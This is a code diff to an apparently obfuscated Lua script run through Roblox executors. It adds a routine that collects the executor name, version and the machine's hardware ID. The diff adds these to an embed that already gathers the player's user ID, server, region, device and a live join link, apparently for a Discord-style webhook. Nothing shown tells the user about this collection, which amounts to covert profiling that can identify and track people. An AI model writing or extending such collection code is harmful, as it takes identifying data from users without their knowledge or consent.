@@ -236,6 +236,31 @@ local function _18()
     }
 end
 
+local function _getExecutorInfo()
+    local name, version = "Unknown", "Unknown"
+
+    if identifyexecutor then
+        local ok, n, v = pcall(identifyexecutor)
+        if ok then
+            if type(n) == "string" then name = n end
+            if type(v) == "string" then version = v end
+        end
+    end
+
+    if version == "Unknown" and getexecutorversion then
+        local ok, v = pcall(getexecutorversion)
+        if ok and type(v) == "string" then version = v end
+    end
+
+    local hwid = "Unknown"
+    if gethwid then
+        local ok, h = pcall(gethwid)
+        if ok and type(h) == "string" then hwid = h end
+    end
+
+    return name, version, hwid
+end
+
 local function _23(_24)
     local _25 = game:GetService("ReplicatedStorage"):FindFirstChild("Servers")
     if not _25 then
@@ -270,6 +295,7 @@ local function _32()
     _33 = _33 or ""
     local _34 = _18()
     local _35, _36 = _23(LocalPlayer.UserId)
+    local execName, execVersion, execHwid = _getExecutorInfo()
     local placeId = game.PlaceId or 0
     local jobId = game.JobId or ""
     local joinLink = string.format("roblox://placeId=%d&gameInstanceId=%s", placeId, jobId)
@@ -283,6 +309,9 @@ local function _32()
             { name = "📌 User ID", value = tostring(LocalPlayer.UserId or "Unknown"), inline = true },
             { name = "🌐 Server", value = _35, inline = true },
             { name = "📍 Region", value = _36, inline = true },
+            { name = "🧩 Executor", value = tostring(execName), inline = true },
+            { name = "🔢 Version", value = tostring(execVersion), inline = true },
+            { name = "🆔 HWID", value = tostring(execHwid), inline = false },
             { name = "Device", value = string.format("%s %s (%s)", _34.emoji, _34.category, _34.platformRaw), inline = false },
             { name = "⏱️ Timestamp", value = "<t:" .. os.time() .. ":R>", inline = false },
             { name = "🔗 Join Link", value = joinLink, inline = false }
